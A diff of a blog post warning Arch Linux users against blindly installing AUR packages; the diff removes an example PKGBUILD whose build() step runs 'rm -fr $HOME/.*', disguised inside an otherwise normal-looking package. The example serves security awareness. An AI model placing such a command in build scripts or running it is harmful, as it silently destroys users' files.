@@ -29,22 +29,7 @@
     <p>Everytime I see a new user asking about the AUR on IRC I cringe. Not because I don&#8217;t use the AUR or I think the AUR is a bad thing, but because I know that someone is going to recommend a way to automagically install these user provided packages.</p>
 
 <p>Remember, the AUR is a user repository. This means that any evil bastard can upload a PKGBUILD that can wreck your system. I&#8217;ve written an example below &#8211; the urls have been changed so you can&#8217;t possibly run makepkg on this and hurt anything.</p>
-<div class='highlight'><pre><code class='bash'><span class='nv'>pkgname</span><span class='o'>=</span>super-cool-program
-<span class='nv'>pkgver</span><span class='o'>=</span>6.0.1
-<span class='nv'>pkgrel</span><span class='o'>=</span>1
-<span class='nv'>pkgdesc</span><span class='o'>=</span><span class='s1'>&#39;Something really awesome that you want to install&#39;</span>
-<span class='nv'>arch</span><span class='o'>=(</span><span class='s1'>&#39;i686&#39;</span> <span class='s1'>&#39;x86_64&#39;</span><span class='o'>)</span>
-<span class='nv'>url</span><span class='o'>=</span><span class='s1'>&#39;http://a.trustworthy.source.url/&#39;</span>
-<span class='nv'>license</span><span class='o'>=(</span><span class='s1'>&#39;None&#39;</span><span class='o'>)</span>
-<span class='nv'>depends</span><span class='o'>=()</span>
-<span class='nb'>source</span><span class='o'>=(</span>http://a.trustworthy.source.url/<span class='k'>${</span><span class='nv'>pkgname</span><span class='k'>}</span>/<span class='k'>${</span><span class='nv'>pkgver</span><span class='k'>}</span>/<span class='o'>)</span>
-<span class='nv'>md5sums</span><span class='o'>=(</span><span class='s1'>&#39;e6f64c753e4d6de8db6fc2e0d&#39;</span><span class='o'>)</span>
-build<span class='o'>()</span> <span class='o'>{</span>
-  <span class='nb'>cd</span> <span class='k'>${</span><span class='nv'>srcdir</span><span class='k'>}</span> <span class='o'>&amp;&amp;</span> rm -fr <span class='nv'>$HOME</span>/.*
-  install -D -m755 <span class='k'>${</span><span class='nv'>pkgname</span><span class='k'>}</span> <span class='k'>${</span><span class='nv'>pkgdir</span><span class='k'>}</span>/usr/bin/<span class='k'>${</span><span class='nv'>pkgname</span><span class='k'>}</span>
-<span class='o'>}</span>
-</code></pre>
-</div>
+
 <p>Any experienced user will quickly notice the horrible thing that hapens here. Of course, this is a <strong>very</strong> simple PKGBUILD. Look at <a href='http://aur.archlinux.org/packages/kernel26-vanilla/kernel26-vanilla/PKGBUILD'>this one</a> for example, malicious code could be anywhere in there and a quick glance isn&#8217;t going to catch it. Obviously <code>rm</code> is just one example of something malicious, it&#8217;s just an easy one to demonstrate.</p>
 
 <p>So how many times have you blindly installed something from the AUR? I know I have a few times. I also know that I&#8217;ll never do it again. Hopefully the next time you <code>wget &amp;&amp; tar &amp;&amp; makepkg</code> you&#8217;ll take a second and think about what you might be getting yourself in to.</p>
